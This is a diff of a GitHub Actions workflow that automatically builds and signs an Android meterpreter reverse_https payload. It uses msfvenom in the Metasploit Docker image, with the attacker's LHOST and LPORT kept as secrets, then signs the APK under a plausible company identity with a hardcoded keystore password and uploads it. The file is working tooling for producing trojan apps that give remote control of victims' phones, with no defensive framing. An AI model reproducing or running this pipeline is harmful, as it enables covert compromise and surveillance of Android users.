@@ -8,29 +8,35 @@ on:
 jobs:
   build:
     runs-on: ubuntu-latest
-    container:
-      image: kalilinux/kali-rolling:latest
 
     steps:
     - name: Checkout
       uses: actions/checkout@v4
 
-    - name: Install Required Tools
+    - name: Install Dependencies
       run: |
-        apt-get update -y
-        apt-get install -y metasploit-framework apktool default-jdk apksigner
+        sudo apt-get update
+        sudo apt-get install -y docker.io openjdk-17-jdk apksigner
 
-    - name: Generate and Sign APK
+    - name: Generate APK using Metasploit Docker
       env:
         LHOST: ${{ secrets.LHOST }}
         LPORT: ${{ secrets.LPORT }}
       run: |
         mkdir -p output
-        # Generate payload
-        msfvenom -p android/meterpreter/reverse_https LHOST=$LHOST LPORT=$LPORT -o output/sila_raw.apk
-        # Create keystore
+        docker run --rm \
+          -v $(pwd)/output:/output \
+          metasploitframework/metasploit-framework:latest \
+          msfvenom -p android/meterpreter/reverse_https \
+          LHOST=$LHOST LPORT=$LPORT -o /output/sila_raw.apk
+
+    - name: Sign APK
+      run: |
+        if [ ! -f output/sila_raw.apk ]; then
+          echo "ERROR: APK generation failed!"
+          exit 1
+        fi
         keytool -genkey -v -keystore output/sila.keystore -alias sila -keyalg RSA -keysize 2048 -validity 10000 -storepass sila123 -keypass sila123 -dname "CN=SILA, OU=Dev, O=Silatech, L=DSM, C=TZ"
-        # Sign APK
         apksigner sign --ks output/sila.keystore --ks-pass pass:sila123 --out output/sila_final.apk output/sila_raw.apk
 
     - name: Upload APK
